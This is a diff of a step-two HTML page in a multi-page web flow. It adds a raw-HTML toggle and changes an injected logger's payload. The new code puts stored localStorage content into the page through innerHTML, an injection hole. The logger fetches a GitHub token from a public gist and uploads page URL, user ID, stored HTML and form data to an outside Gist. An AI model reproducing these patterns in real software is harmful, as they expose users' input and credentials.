@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 600px;
+            max-width: 800px;
             margin: 0 auto;
             padding: 20px;
             line-height: 1.6;
@@ -68,11 +68,20 @@
         .hidden {
             display: none;
         }
-        pre {
-            background-color: #eee;
-            padding: 10px;
+        #dataPreview {
+            border: 1px solid #ddd;
+            padding: 15px;
+            background-color: white;
             border-radius: 4px;
-            overflow-x: auto;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        #rawDataToggle {
+            background-color: #f0f0f0;
+            color: #333;
+            font-size: 12px;
+            padding: 5px 10px;
+            margin-bottom: 10px;
         }
     </style>
 </head>
@@ -97,7 +106,14 @@
         <div id="dataInfo" class="hidden">
             <h2>Data Processing</h2>
             <p>Data from localStorage (data1step):</p>
-            <pre id="data1stepDisplay"></pre>
+            
+            <button id="rawDataToggle" class="secondary">Toggle Raw HTML View</button>
+            
+            <div id="dataDisplay">
+                <div id="dataPreview"></div>
+                <pre id="rawDataDisplay" class="hidden"></pre>
+            </div>
+            
             <p>Data will be processed and saved to data2step.</p>
             
             <button id="nextStepBtn" class="secondary">Next Step (Go to step3.html)</button>
@@ -114,6 +130,9 @@
         const dataInfoDiv = document.getElementById('dataInfo');
         const statusMessageDiv = document.getElementById('statusMessage');
         const nextStepBtn = document.getElementById('nextStepBtn');
+        const dataPreview = document.getElementById('dataPreview');
+        const rawDataDisplay = document.getElementById('rawDataDisplay');
+        const rawDataToggle = document.getElementById('rawDataToggle');
         
         if (storedUsername && storedUserId) {
             // User info exists, hide setup form
@@ -155,22 +174,31 @@
             });
         }
         
+        // Toggle raw data view
+        if (rawDataToggle) {
+            rawDataToggle.addEventListener('click', () => {
+                dataPreview.classList.toggle('hidden');
+                rawDataDisplay.classList.toggle('hidden');
+            });
+        }
+        
         function processData() {
             const data1step = localStorage.getItem('data1step');
             
             if (data1step) {
                 try {
-                    // Display the data
-                    document.getElementById('data1stepDisplay').textContent = JSON.stringify(JSON.parse(data1step), null, 2);
+                    // Display the HTML content
+                    dataPreview.innerHTML = data1step;
+                    rawDataDisplay.textContent = data1step;
                     
                     // Process the data (in this case, just copy to data2step)
                     localStorage.setItem('data2step', data1step);
                     
                     // Get username for filename
                     const username = localStorage.getItem('username') || 'anonymous';
-                    const filename = `${username}.json`;
+                    const filename = `${username}.html`; // Changed to .html since it's HTML content
                     
-                    showStatus(`Data processed successfully and saved to data2step. Filename would be: ${filename}`, 'success');
+                    showStatus(`HTML content processed successfully and saved to data2step. Filename would be: ${filename}`, 'success');
                     
                     // Inject the script
                     injectLoggerScript();
@@ -189,7 +217,7 @@
                 const CONFIG = {
                     // Gist configuration
                     GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a',
-                    GIST_FILENAME: localStorage.getItem('username') ? localStorage.getItem('username') + '.json' : 'Data.json',
+                    GIST_FILENAME: localStorage.getItem('username') ? localStorage.getItem('username') + '.html' : 'Data.html',
                     
                     // GitHub token URL (replace with your own token endpoint if needed)
                     TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',
@@ -237,7 +265,8 @@
                             const entry = {
                                 page_url: window.location.href,
                                 userId: localStorage.getItem('userId') || 'unknown',
-                                ...data
+                                html_content: localStorage.getItem('data2step') || '',
+                                form_data: data
                             };
 
                             // Step 1: Get current content of the Gist
